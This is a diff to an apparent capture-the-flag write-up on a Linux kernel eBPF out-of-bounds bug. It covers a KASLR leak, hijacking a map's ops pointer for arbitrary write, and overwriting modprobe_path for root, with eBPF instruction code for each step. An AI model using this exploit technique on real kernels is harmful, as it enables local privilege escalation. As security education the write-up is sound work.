@@ -215,10 +215,79 @@ struct bpf_map {
 
 Debugging with GDB we found that the start of our array was 0xf8 bytes after the start of the `bpf_map`. We did the following to leak KASLR:
 
-1. Create or `VULN` register
-2. Multiply `VULN * -0xf8`
+1. Create our `VULN` register.
+2. Multiply `VULN * -0xf8`.
 3. Add the result to the pointer returned by `bpf_map_lookup` (the start of the array).
-4. Now we have the address of the `ops` member in our return value register.
-5. We use the `bpf_map_update` function to write the leak into our 2nd index in the array.
+4. Retrieve the value with a `LDX` instruction (read from memory).
+5. Now we have the address of the `ops` member in our return value register.
+6. We use the `bpf_map_update` function to write the leak into our 2nd index in the array.
 
 Now we have a kernel address from userland, and we can calculate KASLR base with this.
+
+### Arbitrary write
+
+I spent a lot of the time looking for a way to achieve arbitrary write, and I could manage to make it work until I faced [this blog](https://stdnoerr.blog/blog/eBPF-exploitation-D3CTF-d3bpf).
+
+The strategy to achieve this arbitrary write relied on the type `BPF_MAP_TYPE_ARRAY_OF_MAPS`. As I said before, each type has its own `ops`, with different functionality depending on the type. `BPF_MAP_TYPE_ARRAY_OF_MAPS` is a map type that stores pointers to other maps and there is something really important in the implementation of the `lookup` function for this type: when we execute a lookup on this kind of object, the return value is not the start of the array, in `BPF_MAP_TYPE_ARRAY` where they return to us the pointer to the first element `&map_array[0]` and we can load and store with `STX` and `LDX`. In the array of maps type, the return value is actually the ``*map_array[0]``, this means that if we have an address in the first element, the lookup will give us the address as a valid pointer we can read or write to.
+
+How can we take advantage of this concept? This only happens when we have an array of maps. Well, we have out of bounds access and if we can **read** the `ops` member, we sure can modify it. In the exploit we partially overwrote the `ops` to point to the `array_of_maps_ops`. This way, if we place an address with `update`, modify the `ops` with our OOB, and then call `lookup`, it will give us the address we gave as an input as a valid pointer.
+
+```c
+BPF_ALU64_IMM(BPF_MUL, VULN, -0xf8),
+BPF_ALU64_REG(BPF_ADD, RETURN_VALUE_REG, VULN), // Add -0xf8 to the start of the array
+BPF_MOV32_IMM(BPF_REG_8, 0xd2c0), 
+BPF_STX_MEM(BPF_H, RETURN_VALUE_REG, BPF_REG_8, 0), // modify by half a word (partial overwrite) the ops member
+
+BPF_ALU64_IMM(BPF_MUL, BPF_REG_9, 0x10), 
+BPF_ALU64_REG(BPF_ADD, RETURN_VALUE_REG, BPF_REG_9),
+BPF_MOV32_IMM(BPF_REG_8, 0xc), // we also modified map_type = BPF_MAP_TYPE_ARRAY_OF_MAPS member to avoid errors
+BPF_STX_MEM(BPF_W, RETURN_VALUE_REG, BPF_REG_8, 0),
+```
+
+Before doing this modifications we setup our array to execute the typical `modprobe_path` approach to achieve privilege escalation.
+
+```c
+update_map(map_fd, 1, &modprobe_path, BPF_ANY);
+update_map(map_fd, 2, &(unsigned long){modprobe_path + 4}, BPF_ANY);
+```
+
+Now after tampering the `ops` member and changing it to `array_of_maps_ops`, if we `lookup` into our map we will write into ``modprobe_path`` and ``modprobe_path+4``, we can just write `/tmp/x` and create the necessary files for the final escalation.
+
+
+```c
+BPF_LD_MAP_FD(MAP_FD_REG, map_fd),
+BPF_MOV64_IMM(BPF_REG_2, 0x1), // key = 1 primer elemento
+BPF_STX_MEM(BPF_DW, STACK_POINTER, BPF_REG_2, -0x8), // set r2
+BPF_MOV64_REG(BPF_REG_2, STACK_POINTER), // set r2
+BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8), // set r2
+BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), // R1 = map_fd, R2 = &key
+BPF_JMP_IMM(BPF_JEQ, RETURN_VALUE_REG, 0, 13),
+
+BPF_MOV64_IMM(BPF_REG_8, 0x706d742f), // <--- /tmp
+BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0),
+
+BPF_LD_MAP_FD(MAP_FD_REG, map_fd),
+BPF_MOV64_IMM(BPF_REG_2, 0x2), // key = 2 tercer elemento
+BPF_STX_MEM(BPF_DW, STACK_POINTER, BPF_REG_2, -0x8), // set r2
+BPF_MOV64_REG(BPF_REG_2, STACK_POINTER), // set r2
+BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8), // set r2
+BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), // R1 = map_fd, R2 = &key
+BPF_JMP_IMM(BPF_JEQ, RETURN_VALUE_REG, 0, 3),
+
+BPF_MOV64_IMM(BPF_REG_8, 0x782f), // <--- /x
+BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0),
+
+BPF_MOV64_IMM(RETURN_VALUE_REG, 0x0),
+BPF_EXIT_INSN()
+```
+
+After this finishes executing, we can read the flag. We added a final `system("/bin/sh")` in the code, because the kernel panics when trying to free the maps, this is of course because of the `ops` modification.
+
+### Getting the flag
+
+![flag](assets/flag.gif)
+
+### Solver
+
+- Final exploit: [exploit.c](assets/exploit.c)
+- eBPF insns: [bpf.h](assets/bpf.h)
